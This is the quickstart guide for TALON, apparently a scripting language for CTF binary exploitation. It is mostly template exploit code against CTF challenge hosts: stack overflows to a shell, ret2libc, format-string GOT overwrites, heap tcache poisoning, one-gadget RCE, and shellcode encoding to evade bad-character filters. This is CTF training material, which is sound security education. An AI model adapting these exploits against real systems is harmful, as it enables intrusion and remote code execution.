# TALON CTF Quickstart Guide

## Get Exploiting in 5 Minutes

### Installation

```bash
# Clone and build
git clone https://github.com/your-org/talon
cd talon
cargo build --release

# Add to PATH
export PATH=$PATH:$(pwd)/target/release
```

### Your First Exploit

Create `exploit.talon`:

```talon
# Connect to CTF challenge
let conn = connect("pwn.chal.ctf", 1337)

# Build simple buffer overflow
let offset = 72
let ret_addr = 0x08048abc
let payload = cyclic(offset) + p64(ret_addr)

# Send and get shell
send(conn, payload)
interactive(conn)
```

Run it:

```bash
talon run exploit.talon
```

## Common CTF Patterns

### Pattern 1: ret2libc

```talon
# Leak libc address
let elf = analyze("./vuln")
let conn = connect("pwn.chal.ctf", 1337)

# Leak __libc_start_main
let leak_chain = cyclic(72) + p64(pop_rdi) + p64(got_libc) + p64(plt_puts) + p64(main)
send(conn, leak_chain)
let leak = u64(recv(conn, 8))

# Calculate libc base and get shell
let libc_base = leak - 0x21b10
let system = libc_base + 0x4f440
let binsh = libc_base + 0x1b3e9a

let final = cyclic(72) + p64(pop_rdi) + p64(binsh) + p64(system)
send(conn, final)
interactive(conn)
```

### Pattern 2: Format String

```talon
let conn = connect("pwn.chal.ctf", 9999)

# Find offset
let offset = find_fmt_offset(conn, 0x41414141)

# Leak GOT entry
send(conn, "%{}$s".format(offset) + p64(got_printf))
let printf_leak = u64(recv(conn, 8))

# Calculate and write
let libc_base = printf_leak - 0x64f70
let system = libc_base + 0x4f440

# Overwrite GOT
let writes = fmtstr_write(offset, {got_exit: system})
send(conn, writes)
```

### Pattern 3: Heap Tcache Poisoning

```talon
let conn = connect("pwn.chal.ctf", 31337)

# Allocate and free chunks
for i in range(7)
    send(conn, "1")  # Alloc
    send(conn, "128")
end

for i in range(7)
    send(conn, "2")  # Free
    send(conn, str(i))
end

# Poison tcache fd
send(conn, "4")  # Edit (UAF)
send(conn, "0")
send(conn, p64(target_addr))

# Get chunk at arbitrary address
send(conn, "1")
send(conn, "128")
send(conn, "1")
send(conn, "128")
send(conn, payload)
```

### Pattern 4: One-Gadget

```talon
# Leak libc
let leak = u64(recv(conn, 8))
let libc_base = leak - 0x21b10

# Use one-gadget instead of system
let one_gadget = libc_base + 0x4f3d5

# Simple overflow to one-gadget
send(conn, cyclic(72) + p64(one_gadget))
interactive(conn)
```

## Essential TALON Functions

### Binary Analysis

```talon
let elf = analyze("./binary")
print(elf.pie)        # PIE enabled?
print(elf.nx)         # NX enabled?
print(elf.canary)     # Canary enabled?
print(elf.plt)        # PLT entries
print(elf.got)        # GOT entries
print(elf.symbols)    # Symbol addresses
```

### ROP Gadgets

```talon
let gadgets = quick_rop("./binary")
let pop_rdi = gadgets.find("pop rdi; ret")
let pop_rsi_r15 = gadgets.find("pop rsi; pop r15; ret")
let ret = gadgets.find("ret")
```

### Packing/Unpacking

```talon
# Pack
p64(0xdeadbeef)     # -> 8 bytes little-endian
p32(0x08048000)     # -> 4 bytes little-endian

# Unpack
u64([0xef, 0xbe, 0xad, 0xde, 0, 0, 0, 0])  # -> 0xdeadbeef
u32(data[0:4])      # First 4 bytes to int
```

### Cyclic Patterns

```talon
let pattern = cyclic(200)    # Generate pattern
send(conn, pattern)

# After crash, find offset
let offset = cyclic_find(0x61616171)  # Find "qaaa"
```

### Network

```talon
let conn = connect("host", port)
send(conn, data)
let response = recv(conn, 1024)
let line = recv_until(conn, "\n")
interactive(conn)  # Drop to shell
close(conn)
```

### Shellcode

```talon
# Get pre-built shellcode
let sc = shellcode("x64", "execve")

# Encode to bypass filters
let encoded = xor_encode(sc, 0x42)
let alphanum = alphanumeric_encode(sc)

# Test for badchars
if has_badchars(sc, [0x00, 0x0a])
    sc = encode_shellcode(sc)
end
```

### File Operations

```talon
let data = read("shellcode.bin")
write("exploit.bin", payload)
let text = str(read("flag.txt"))
```

## Tips & Tricks

### Debug Locally First

```talon
# Test locally before remote
let local = process("./vuln")
send(local, payload)
```

### Use Helper Functions

```talon
include "stdlib/ctf_helpers.talon"

# Auto-calculate libc base
let libc_base = calc_libc_base(leak, 0x21b10)

# Build standard ret2libc
let addrs = build_ret2libc_chain(libc_base, false)
```

### Stack Alignment

```talon
# Add extra ret for 16-byte alignment
let payload = cyclic(offset)
payload = payload + p64(ret)  # Alignment gadget
payload = payload + p64(pop_rdi)
payload = payload + p64(binsh)
payload = payload + p64(system)
```

### Leak Multiple Addresses

```talon
# Chain multiple leaks
let chain = [
    pop_rdi, got_puts, plt_puts,
    pop_rdi, got_libc, plt_puts,
    main
]

for gadget in chain
    payload = payload + p64(gadget)
end
```

## Example CTF Scripts

Check `examples/` directory for complete exploits:

- `ctf_ret2libc_pwn.talon` - Standard ret2libc
- `ctf_format_string_leak_write.talon` - Format string exploitation
- `ctf_heap_tcache_poison.talon` - Heap tcache poisoning
- `ctf_one_gadget_pwn.talon` - One-gadget RCE
- `ctf_blind_rop.talon` - Blind ROP when no binary
- `ctf_kernel_exploit.talon` - Kernel exploitation
- `ctf_shellcode_encoder.talon` - Badchar bypass
- `ctf_multi_stage_pwn.talon` - Multi-stage exploitation

## Interactive REPL

Test code quickly:

```bash
$ talon repl
talon> let data = p64(0xdeadbeef)
talon> print(hex(u64(data)))
0xdeadbeef
talon> let pattern = cyclic(100)
talon> let offset = cyclic_find(0x61616171)
talon> print(offset)
24
```

## Cheatsheet

Quick reference:

```bash
talon cheatsheet          # Show all functions
talon cheatsheet rop      # ROP functions
talon cheatsheet heap     # Heap functions
talon cheatsheet network  # Network functions
```

## Common Workflows

### Workflow 1: Binary Exploitation

1. `analyze()` - Check protections
2. `quick_rop()` - Find gadgets
3. `cyclic()` - Find crash offset
4. Build leak payload
5. Calculate libc base
6. Build final payload
7. Get shell

### Workflow 2: Format String

1. Find format offset
2. Leak addresses
3. Calculate targets
4. Build write payload
5. Trigger execution

### Workflow 3: Heap Exploitation

1. Understand heap structure
2. Trigger primitives (UAF, overflow, etc.)
3. Leak heap/libc
4. Poison metadata
5. Arbitrary write
6. Trigger win condition

## Getting Help

- **Documentation**: `talon help <function>`
- **Examples**: `examples/` directory
- **Tutorials**: `examples/tutorial_*.talon`
- **Community**: GitHub Issues

## Next Steps

1. Try `examples/tutorial_01_basics.talon`
2. Read `examples/tutorial_02_exploitation.talon`
3. Practice with CTF challenges
4. Build your own exploit library in `stdlib/`

Happy Hacking!
